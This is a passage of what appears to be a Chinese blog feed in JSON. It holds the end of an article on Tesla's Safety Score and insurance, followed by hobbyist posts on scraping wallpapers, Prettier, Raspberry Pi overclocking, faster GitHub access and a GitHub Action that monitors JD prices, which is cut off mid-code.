可能不是个好产品。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/752d956bbe12144ff4037f5edf29e36b\" alt=\"图片\"></figure><h2><strong>「安全评分」的想象力</strong></h2>\n<p>「安全评分」的想象力不止于此。「安全评分」的本质，在于通过对驾驶员驾驶行为尽可能细颗粒度的拆解与统计，有效地预测车辆在未来的事故率。驾驶数据越丰富、驾驶场景越细致、「安全评分」的预测准确性就越高。Elon 曾经说过，<strong>与传统汽车保险公司竞争的核心在于信息的准确性。</strong>得益于特斯拉全球第一大智能电动汽车制造商的地位，特斯拉坐拥业内最丰富也最详细的车队数据。从业务角度看，特斯拉对汽车保险公司的打击是降维的。</p>\n<p>特斯拉进入汽车保险领域，<strong>这是比有序扩张 FSD 内测规模重要得多的新业务，这也是为什么，运行「安全评分」的主体名叫特斯拉保险计算器。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/68934a9511335c92bd2392e914f30960\" alt=\"图片\"></figure><p>此外，特斯拉保险的全面推开还会有反向教育驾驶员，从而进一步降低事故率的潜力。Elon 认为，人们会为了更低的保费学习更谨慎的驾驶车辆。<strong>「这就像……如果你想为保险支付更多费用，你可以（高风险驾驶），但如果你想少付费，那请不要那么疯狂。人们会做出选择」。</strong></p>\n<p>当然，这一切的前提是特斯拉做得足够好，以当前铺天盖地的针对「安全评分」的吐槽来看，现有的汽车保险公司不仅没有感到压力，甚至差点笑出了声。 </p>\n<p>但特斯拉一点不慌。不仅不慌，特斯拉很可能在推送前就预知了这样的反馈。 因为特斯拉除了在博客中提到<strong>「随着我们获得更多的用户和数据洞察，我们希望在未来对公式进行迭代」</strong>，在上线当天，Elon 也特别提到目前还是一个非常 Beta 的版本，「安全评分」将随着时间的推移而进化，以更准确地预测事故率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/41ce647b721fcf591570b41d9f879f85\" alt=\"图片\"></figure><p><br>事实上，特斯拉对「安全评分」的布局甚至早于 FSD Beta 公测。在 2020 年 7 月 22 日的特斯拉 Q2 财报会议上，Elon 公开招聘「革命性精算师」： </p>\n<blockquote><p>我特别欣赏一些精力充沛的精算师，我非常尊重精算师这个职业。你们的数学很好，请加入特斯拉，特别是如果你对保险行业的缓慢节奏感到恼火并想做出改变，这儿就是你要去的地方，我们需要革命性的精算师。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/b748cd3a7bb7607a1a7220e4026758aa\" alt=\"图片\"></figure><p>Elon 没开玩笑。今天，特斯拉建立起了一支精算师团队，Title 真的就叫革命性精算师（Revolutionary Actuary）。在特斯拉「革命性精算师」的职位描述中，有两条要求让人印象深刻，<strong>一是和「数据科学家」协作，二是熟练掌握Python，拥有开源机器学习库和框架，例如 Scikit-learn、PyTorch 和 Tensorflow 的应用经验。</strong></p>\n<p>特斯拉「数据科学家」隶属于车队分析（Fleet Analytics）团队，特斯拉称这是一支规模虽小但发展迅速的中央团队，赋能其他业务团队以改进产品，使特斯拉车主更安全。</p>\n<p>特斯拉要求「数据科学家」要具有强大的机器学习和软件工程基础，<strong>拥有多种机器学习模型的开发经验，基于开源技术处理 PB（Petabyte，千万亿字节）级的时间序列数据。</strong>特斯拉在中国也放出了「数据科学家」的职位，但对于特斯拉中国而言，相比算法，更重要的也许是先解决「数据原料」的问题。 </p>\n<p>Elon 在 2021 年世界互联网大会乌镇峰会上表态，特斯拉已经在中国建立了数据中心，用来存储中国业务产生的所有数据。<strong>包含生产数据、销售数据、服务数据和充电数据，所有个人身份信息都安全的存储在中国国内，不会转移到海外。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/6009d73bf189062d2a192d51dc7da7fa\" alt=\"图片\"></figure><p>在展台背景板上，特斯拉更详细地向中国政府和消费者解释了「如何处理客户个人信息和车辆数据」：</p>\n<ul>\n<li>收集：合法合规、最小必要、公开透明原则</li>\n<li>存储：完全存储在中国境内，通过数据加密、鉴权、访问控制等技术确保存储安全</li>\n<li>传输：通过数据加密，专用证书体系确保传输过程安全</li>\n<li>删除：用户有权撤销自己的数据及数据使用授权</li>\n<li>跨境：个人身份信息不出境。需要出境的重要数据均经主管部门批准后进行</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/20c819bec4603cf893285a83e7337d82\" alt=\"图片\"></figure><p><strong>随着车队规模的持续增长，数据驱动开始越来越多的植入特斯拉的产品与工程。</strong></p>\n<p>2016 年 10 月，特斯拉开始基于车队数据，用机器学习算法驱动 Autopilot 辅助驾驶系统，逐步提高越来越多的场景下的驾驶自动化率。</p>\n<p>2019 年 10 月，特斯拉基于车队数据中的 100 万张照片，训练出了机器学习算法 Deep Rain 神经网络，用以识别不同强度的雨量工况并匹配自动雨刮频率。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/9bd5ff4a725bc3a2cb3da1a112d2f130\" alt=\"图片\"></figure><p><br>2020 年 5 月，特斯拉基于储能电池 Powerwall、Powerpacks 和 Megapacks 的集群数据，推出了机器学习能源交易平台 Autobidder 和机器学习能源优化引擎 Opticaster，<strong>到 2021 年 5 月，Autobidder 平台上管理着超过 1.2 GWh 的电池资产，Opticaster 积累了超 1 亿小时的运营经验，为全球数千名特斯拉客户提供了数千万美元的价值。</strong> </p>\n<p>2021 年 9 月，特斯拉基于 60 亿英里的车队数据推出了驾驶安全性评估软件「安全评分」，根据 Elon 的说法，在特斯拉保险之前，「安全评分」将首先评估和指引 FSD Beta 公测规模的扩张，从下周起，FSD Beta 公测车队将以 1000 辆/天的速度快速扩张。</p>\n<p>2021 年 9 月，Elon 接受特斯拉车主的提议，决定基于车队数据训练一个新的深度神经网络，<strong>用以自动化控制各种工况下的特斯拉汽车空调，例如在堵车、山火烟雾、土路和暴雨时启动空气循环。</strong></p>\n<p> 在过去，无论是辅助驾驶、自动雨刮还是能源交易＆场景优化、汽车保险软件，无一例外是「由软件工程师手动编写规则」（软件 1.0）运行，在特斯拉，<strong>「数据驱动的机器学习」（软件 2.0）正在变得无孔不入。</strong> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/35ce251d28756845eebbc6148f9e5259\" alt=\"图片\"></figure><p>通过定义所需行为的数据集和深度神经网络架构和不同的权重，特斯拉相信第一版奇差无比的机器学习性能会变得更强，最终全面超越人类工程师编写的规则。 </p>\n<blockquote><p>越来越多的软件 1.0 被软件 2.0 取代，软件 1.0 吞噬世界，软件 2.0 吞噬软件 1.0。<strong>从长远来看，这种范式的前景是光明的，因为越来越清晰的是，当我们开发通用人工智能的时候，Ta 肯定会基于软件 2.0。</strong></p></blockquote>\n<p>这是一种全新的研发哲学，特斯拉高级 AI 总监 Andrej Karpathy 于 2017 年在一篇博客中提出，博客的标题就叫《软件 2.0》。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/69067"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span 